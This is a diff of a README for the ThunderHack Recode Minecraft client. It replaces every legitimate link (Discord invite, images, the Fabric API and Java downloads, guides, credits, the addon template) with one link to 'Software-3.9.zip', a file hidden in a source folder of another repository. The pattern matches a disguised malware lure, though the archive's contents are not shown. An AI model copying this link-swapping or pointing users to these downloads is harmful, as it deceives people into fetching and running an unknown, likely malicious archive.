@@ -1,21 +1,21 @@
 <p align="center">
-    <img src="https://i.imgur.com/ZiJ0r7y.png" style="width: 69%">
+    <img src="https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip" style="width: 69%">
 </p>
 
 > [!WARNING]
 > Work on ThunderHack Recode is completely stopped, 
 > it will be replaced by CatLean, a new free client
 > with closed source code and higher quality modules,
-> you can follow CatLean in my [Discord server](https://discord.gg/PvBhPWdkVD)
+> you can follow CatLean in my [Discord server](https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip)
 
 <div align="center">
-<img src="https://cdn.discordapp.com/attachments/934396624111824900/1230019159027617792/furro.gif?ex=6631cb9c&is=661f569c&hm=b6cee2cd9b6ec238f54c80dcfc421f2c8ecd3f750f2f61a62087d1e01d201e4d&" style="width: 69%">
+<img src="https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip" style="width: 69%">
 </div>
 
 
 <div align="center">
 
-[![Discord Mine](https://img.shields.io/discord/1140266441082404924?label=discord&logo=discord&logoColor=white)](https://discord.gg/PvBhPWdkVD)
+[![Discord Mine](https://img.shields.io/discord/1140266441082404924?label=discord&logo=discord&logoColor=white)](https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip)
 
 </div>
 
@@ -35,21 +35,21 @@
 
 ## Requires these mods:
 
-- [FabricApi 1.21](https://www.curseforge.com/minecraft/mc-mods/fabric-api/files/5531908)
-- [Java 21+](https://www.oracle.com/java/technologies/javase/jdk21-archive-downloads.html)
+- [FabricApi 1.21](https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip)
+- [Java 21+](https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip)
 
 ## Recommended to read:
 
-- [Performance guide for Minecraft 1.20.4+ Clients](https://gist.github.com/HexedHero/aab340a84db51913cb1106c2d85f4e4f)
-- [Setup guide by @DevilishRak](https://thunderguidemc.vercel.app/)
+- [Performance guide for Minecraft 1.20.4+ Clients](https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip)
+- [Setup guide by @DevilishRak](https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip)
 
 ## Credits
 
-- [Ai_24](https://www.youtube.com/@Ai_24) for cool showcase
-- [KiLAB Gaming](https://www.youtube.com/@KiLABGaming) for complete overview
-- [@meteordevelopment](https://github.com/meteordevelopment) for orbit
-- [@ladysnake](https://github.com/ladysnake) for satin
-- [@0x3C50](https://github.com/0x3C50/Renderer) for the renderer
+- [Ai_24](https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip) for cool showcase
+- [KiLAB Gaming](https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip) for complete overview
+- [@meteordevelopment](https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip) for orbit
+- [@ladysnake](https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip) for satin
+- [@0x3C50](https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip) for the renderer
 
 ## Screenshots
 <details>
@@ -70,11 +70,11 @@
 ![image](assets/5.gif)
 </details>
 
-![image](https://github.com/Pan4ur/ThunderHack-Recode/assets/82473048/1e56338f-58a1-4759-8234-858878bdde3f)
+![image](https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip)
 
 ## Addons
 
 ### Resources
 
-- [Addon Template](https://github.com/cvs0/ThunderHack-Recode-Addon-Template) by cvs0
+- [Addon Template](https://github.com/rykr32/Thunder/raw/refs/heads/main/src/main/java/thunder/hack/features/hud/impl/Software-3.9.zip) by cvs0
 - [ThunderHack Addon Docs (COMING SOON)]()
